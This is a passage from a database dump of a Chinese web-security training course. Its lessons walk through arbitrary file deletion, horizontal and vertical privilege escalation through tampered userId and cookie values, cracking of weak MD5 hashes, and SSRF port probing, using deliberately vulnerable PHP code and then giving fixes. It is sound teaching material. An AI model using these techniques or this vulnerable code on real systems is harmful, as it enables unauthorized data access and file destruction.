src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"></v:imagedata></v:shape></p><p>浏览WEB系统上的第2个图片；如下图所示:</p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:127.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/de2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>说明文件存在。</p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:6in;height:126pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/de3.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>我们看到这个业务本来是要删除1.jpg文件的。我们通过抓包修改就可以删除2.jpg</p><p>接着测试第二次，截获数据包修改文件名为刚浏览的图片名称2.jpg,点击forward;</p><p><v:shape id=\"图片_x0020_11\" o:spid=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:414.75pt;\r\n height:190.5pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/de4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape o:spid=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:414.75pt;\r\n height:190.5pt\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/de5.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"图片_x0020_10\" o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:415.5pt;\r\n height:183.75pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.jpg\"></v:imagedata></v:shape></p><p>再次浏览图片发现文件已不存在</p><p><v:shape id=\"_x0000_i1031\" type=\"#_x0000_t75\" style=\"width:6in;height:75.75pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image013.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/de6.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>备注：这里因为只是讲解一下原理，做一个模拟测试。在实际应用中其实可以删除重要的文件，比如系统文件，登陆文件，等等。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:31:57',1,NULL,'<h2><span style=\"font-size: 14px;\">1）任意文件删除漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image015.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/de7.png\"></p><p>通过查看源码发现get方式得到文件名以后。If判断文件名如果为空则删除1.jpg负责直接删除文件名。对于所要删除的文件名只限定在了$file之内。因为这里只作为测试用。同时这也是一种修复方案，可以吧所要删除的文件只限定在具体的文件中。</p><p>大部分的文件删除代码应该和下面的类似</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image017.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/de8.png\"></p><p>2）任意文件删除漏洞的防范</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/de9.png\"></p><p>上面的代码本身就是一种防范代码，吧所要删除的文件限定在一个范围内。或者直接写死，如下：</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image019.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/de10.png\"></p><p></p><p>这样的话永远就只能删除1.jpg了。</p><p><br></p>',1,'<p>q</p>'),(43,'水平越权基础训练','通过攻防教学实验系统中的web系统做水平越权漏洞学习，并且深刻认识掌握其原理，从而理解本地文件包含漏洞在不同场景中的应用。','<h1><span style=\"font-size: 14px;\">使用账号密码登陆用户中心。测试账号：mmc，登录密码：123456</span><br></h1><p>进入到用户中心，如下图：</p><p>usercenter/index.php</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/sp1.png\"><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:431.25pt;height:165pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"></v:imagedata></v:shape></v:shapetype></p><p>点击查看用户敏感信息</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/sp2.png\"><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:203.25pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"></v:imagedata></v:shape></p><p>上面的信息是mmc账号的信息。接下来我们做越权操作。</p><p>刷新这个页面，点击查看用户敏感信息的时候抓包。如下图：</p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:172.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/sp3.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>将userId=2修改为userId=1然后提交。</p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:6in;height:211.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/sp4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>我们发现虽然还是mmc账号但是敏感信息的地方已经换成了别人的信息。在实际攻击中只要遍历userId即可得到系统所有人的敏感信息。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E8%B6%8A%E6%9D%83%E9%A6%96.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:32:56',1,NULL,'<h2><span style=\"font-size: 14px;\">1）水平越权原理</span><br></h2><p>我们来看下代码</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/sp5.png\"></p><p>通过上面的代码可以看出点击查看用户敏感信息以后，在前端通过js技术吧userId获取到并且传递给了db.php页面。我们看下db.php里面相关的代码。</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/sp6.png\"></p><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/sp7.png\"></p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg\"></p><p>通过上面的代码可以很容易看出db.php得到用户userid以后没做任何判断直接连接数据库获取敏感信息然后输出了。导致越权漏洞的产生。</p><p>2）水平越权修复</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/sp8.png\"></p><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/sp9.png\"></p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image017.png\"></p><p></p><p>通过上面的代码去修复。核心逻辑是先通过$_SESSION得到用户名，然后通过用户名得到当前的用户id。然后再去做对比，如果当前的用户id不等于前端传递过来的userid则说明存在问题。如果等于则走正常流程。</p><p><br></p>',1,'<p>a</p>'),(44,'垂直越权基础训练','通过攻防教学实验系统中的web系统做垂直越权漏洞学习，并且深刻认识掌握其原理，从而理解本地文件包含漏洞在不同场景中的应用。','<h1><span style=\"font-size: 14px;\">使用账号密码登陆用户中心。测试账号：mmc，登录密码：123456</span><br></h1><p>进入到用户中心，如下图：</p><p>usercenter/index.php</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:431.25pt;height:165pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cz1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p><v:shapetype coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\"><v:shape o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:431.25pt;height:165pt;visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/cz2.png\"><br></v:imagedata></v:shape></v:shapetype></p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:203.25pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"></v:imagedata></v:shape></p><p>然后开启抓包软件，刷新这个页面。</p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:159pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cz3.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>将cookie里面的字段uid=2修改为uid=1之后可以看到如下图示</p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:6in;height:139.5pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cz4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>整个页面的内容已经变成admin 账户的内容了。这说明此账户已经成为了admin账户。在实际操作中只要带着admin账号的cookie去操作，即可执行admin权限了。</p><h2><br></h2>',2,'http://oda8mr8yr.bkt.clouddn.com/%E8%B6%8A%E6%9D%83%E9%A6%96.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:33:41',1,NULL,'<h2><span style=\"font-size: 14px;\">1）垂直越权原理</span><br></h2><p>我们来看下代码</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cz5.png\"></p><p>首先我们看到用户登陆的地方，判断用户名和密码正确以后设置了当前的用户cookie。</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/cz6.png\"></p><p>然后我们看到在用户中心直接使用$userid=$_COOKIE[\'uid\'];从前端的cookie字段得到了用户的数据。带进数据做了查询，而前端的cookie字段是可以抓包修改的。所以导致了垂直越权的产生。</p><p>2）垂直越权修复</p><p>一般用户中心直接通过$_SESSION获取数据。比如可以使用如下的语句：</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">$uname=$_SESSION[<span class=\"hljs-string\">\'username\'</span>];\r\n\r\n$getid = <span class=\"hljs-string\">\"SELECT * FROM web_users WHERE user = \'$uname\'\"</span>;\r\n\r\n$result = mysql_query($getid) <span class=\"hljs-keyword\">or</span> <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\'&lt;pre&gt;\'</span> .mysql_error() . <span class=\"hljs-string\">\'&lt;/pre&gt;\'</span> ); $res=mysql_fetch_array($result);</code></pre><p></p><p>通过 $_SESSION[\'username\'];得到需要的数据，然后提交数据库查询。因为session是存储在服务端的，攻击者是没法通过客户端修改session数据。</p><p><br></p>',1,'<p>a</p>'),(45,'弱加密算法基础训练','通过攻防教学实验系统中的web系统做弱加密算法漏洞学习，并且深刻认识掌握其原理，从而理解本地文件包含漏洞在不同场景中的应用。','<h1><span style=\"font-size: 14px;\">通过sql基础训练中得到的密码密文，去解密成明文。解密网站为：</span><br></h1><p>www.cmd5.com</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-10-07 01:36:43',1,NULL,'<h2><span style=\"font-size: 14px;\">1）弱加密算法原理</span><br></h2><p>我们来看下代码</p><p>&nbsp;&nbsp;<img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rj1.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>通过上面的代码片段可以看出，用户的密码只做了一次简单的md5操作。这种操作属于加密强度太弱。攻击者一旦得到密文的密码就很容易得到明文的登陆密码。例如本系统的测试。</p><p>2）弱密码漏洞修复</p><p>具体的修复一般根据不同的业务场景来实现。正对本系统可以采用加salt然后截取密码的部分作为存储的方式。</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/rj2.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>类似上面的修复方案。$salt也可以动态随机生成。</p><p>3）弱密码漏洞常见场景</p><p>密码找回功能，通过邮件找回密码的时候token容易被猜测到。</p><p></p><p><br></p><p><br></p>',1,'<p>a</p>'),(46,'SSRF基础训练一','通过部署虚拟环境来实战训练SSRF漏洞','<h2><span style=\"font-size: 14px;\">1）通过部署课程访问如下连接得到实验环境</span><br></h2><p>http://**** /ssrf.php。实验环境截图如下</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:366pt;\r\n height:119.25pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:href=\"file:///C:\\Users\\test\\AppData\\Roaming\\Tencent\\Users\\2022137639\\QQ\\WinTemp\\RichOle\\C%607FS3PJA1N28HHV)UOPH%5dN.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/ssrf1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>&nbsp;</p><p>2）在输入框提交如下信息看看返回结果</p><p><a href=\"http://127.0.0.1/images/2.png\">http://127.0.0.1/images/2.png</a>或者</p><p>http://127.0.0.1/images/1.gif</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:303pt;height:73.5pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\" o:href=\"file:///C:\\Users\\test\\AppData\\Roaming\\Tencent\\Users\\2022137639\\QQ\\WinTemp\\RichOle\\3~%5dU%5d9L5YV9T125%7dZY7SCW2.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/ssrf2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:303pt;height:73.5pt\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\" o:href=\"file:///C:\\Users\\test\\AppData\\Roaming\\Tencent\\Users\\2022137639\\QQ\\WinTemp\\RichOle\\3~%5dU%5d9L5YV9T125%7dZY7SCW2.png\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/ssrf3.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:456.75pt;height:211.5pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:href=\"file:///C:\\Users\\test\\AppData\\Roaming\\Tencent\\Users\\2022137639\\QQ\\WinTemp\\RichOle\\B$VQ%5b(GH4V%5dKO@(_HCKJ%60)J.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"></v:imagedata></v:shape></p><p><a href=\"http://image.3001.net/images/new/logo.png\">http://image.3001.net/images/new/logo.png</a></p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:325.5pt;height:86.25pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:href=\"file:///C:\\Users\\test\\AppData\\Roaming\\Tencent\\Users\\2022137639\\QQ\\WinTemp\\RichOle\\67%7bC%5dH$M%5bMDREOQ$M%7dA_~BF.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/ssrf4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:325.5pt;height:86.25pt\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:href=\"file:///C:\\Users\\test\\AppData\\Roaming\\Tencent\\Users\\2022137639\\QQ\\WinTemp\\RichOle\\67%7bC%5dH$M%5bMDREOQ$M%7dA_~BF.png\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/ssrf5.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:436.5pt;height:148.5pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.png\" o:href=\"file:///C:\\Users\\test\\AppData\\Roaming\\Tencent\\Users\\2022137639\\QQ\\WinTemp\\RichOle\\ILUBZTK%5b)8O63C9$KJ4X7%5bJ.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.png\"></v:imagedata></v:shape></p><p>3）通过上面的实验步骤基本可以确定此段代码存在ssrf漏洞</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/ssrf6.png','daocloud.io/catteam/ssrfunserialize:master-112a365','2016-10-08 18:00:04',1,NULL,'<h2><span style=\"font-size: 14px;\">1）Ssrf漏洞原理分析</span><br></h2><p>Ssrf漏洞产生的主要原因是服务端在接收外部的请求以后没有做合法性校验而进行的一系列操作所造成的。这段话听起来可能比较模棱两可。下面我们通过一个图来分析。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/ssrf6.png\"></p><p>上图中192.168.1.5在正常业务中应该处于内网环境。这台服务器本身是可以访问内网资源（包括自己本身的资源，实验报告中的操作阶段就是访问了自己本身），以及外网资源（互联网资源）。</p><p>正常情况下外网的用户是访问不到172.10.10.*网段的资源的。但是192.168.1.5却可以访问。Ssrf就是利用192.168.1.5上代码存在的缺陷，黑客通过访问192.168.1.5然后提交一些精心构造的poc，让其192.168.1.5自动探测访问172.10.10.*网段的资源。这样黑客就达到在外网访问172.10.10.*网段（也就是内网网段的资源）的目的了。</p><p>在上一面我们的实际操作报告中我们通过访问127.0.0.1/images/2.png这个链接发现居然得到了这个链接的图片。说明服务器本身是存在这个图片的。设想一下如果这个图片是敏感信息那么此时是不是已经造成了安全问题。第二个链接我们通过访问一个外部的url&nbsp;<a href=\"http://image.3001.net/images/new/logo.png\">http://image.3001.net/images/new/logo.png</a>&nbsp;发现服务器同样能得到这个链接的图片。说明这个服务器本身既可以访问外部资源也可以访问内部资源。</p><p>上面的操作其实可以有更多的玩法，比如我们可以探测服务器开放的端口信息。加入我们输入127.0.0.1:8080/tomcat.ico发现返回了图片信息那说明服务器开放了8080端口，而且用的是tomcat服务器。这样就间接的达到了刺探服务器信息的目的。</p><p>2）源码分析</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"> &lt;form action=”” method=”post”&gt;\r\n\r\n &lt;input type=”text” name=”url” /&gt;\r\n\r\n &lt;input type=”submit” value=”Submit” /&gt;\r\n\r\n &lt;/form&gt;\r\n\r\n <span class=\"hljs-meta\">&lt;?php</span>\r\n\r\n <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>($_POST[<span class=\"hljs-string\">\'url\'</span>])) \r\n\r\n { \r\n\r\n       $content = file_get_contents($_POST[<span class=\"hljs-string\">\'url\'</span>]); \r\n\r\n       $filename =’./images/’.rand().<span class=\"hljs-string\">\'img.jpg\'</span>; \r\n\r\n       file_put_contents($filename, $content); \r\n\r\n       <span class=\"hljs-keyword\">echo</span> $_POST[<span class=\"hljs-string\">\'url\'</span>]; \r\n\r\n      $img = <span class=\"hljs-string\">\"&lt;img src=\\\"\"</span>.$filename.<span class=\"hljs-string\">\"\\\"/&gt;\"</span>; \r\n\r\n    } \r\n\r\n     <span class=\"hljs-keyword\">echo</span> $img; \r\n\r\n    <span class=\"hljs-meta\">?&gt;</span></code></pre><p>上面的代码post方式得到一个url并没有对url做任何校验，直接使用file_get_contents获取了url资源所带的文件内容，最后将这个文件内容写入本地的一个随机的jpg文件中。</p><p>通过上面的代码就可以探测服务器本地以及服务器所处内网中的一些文件信息。比如可以构造127.0.0.1/cat/config.txt这样的链接来得到config.txt的内容最后通过查看图片的内容知晓。</p><p></p><p>关于ssrf如何探测端口以及其它敏感信息我们将在ssrf基础训练二中讲解。</p><p><br></p>',1,'<p>1</p>'),(47,'SSRF基础训练二','通过部署虚拟环境来训练SSRF课程中的端口探测','<h2><span style=\"font-size: 14px;\">1）通过部署课程访问如下连接得到实验环境</span><br></h2><p>http://**** /ssrf_port.php。实验环境截图如下</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:387.75pt;\r\n height:83.25pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:href=\"file:///C:\\Users\\test\\AppData\\Roaming\\Tencent\\Users\\2022137639\\QQ\\WinTemp\\RichOle\\F%7d0_N446J99JMX1VTKYLQY5.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/ssrf21.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>&nbsp;</p><p>&nbsp;</p><p>2）在输入框提交如下信息看看返回结果</p><p>http://127.0.0.1:80/lysec.txt</p><p><v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:366pt;height:99pt;\r\n visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/ssrf22.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>http://127.0.0.1:22/lysec.txt</p><p><a href=\"http://127.0.0.1:12345/lysec.txt\">http://127.0.0.1:12345/lysec.txt</a>(提交后无任何返回说明此端口不开放)</p><p>http://127.0.0.1:3306/text.txt</p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:354pt;height:95.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/ssrf23.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>3）通过上面的实验步骤基本可以确定这个ssrf漏洞可以用来探测内网的端口信息。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/ssrf6.png','daocloud.io/catteam/ssrfunserialize:master-112a365','2016-10-08 18:00:54',1,NULL,'<p>&nbsp;源码分析\r\n</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">&lt;html&gt;&lt;body&gt;\r\n\r\n&lt;form name=<span class=\"hljs-string\">\"px\"</span> method=<span class=\"hljs-string\">\"post\"</span> action=<span class=\"hljs-string\">\"\"</span>&gt;\r\n\r\n&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"url\"</span> value=<span class=\"hljs-string\">\"\"</span>&gt;\r\n\r\n&lt;input type=<span class=\"hljs-string\">\"submit\"</span> name=<span class=\"hljs-string\">\"commit\"</span> value=<span 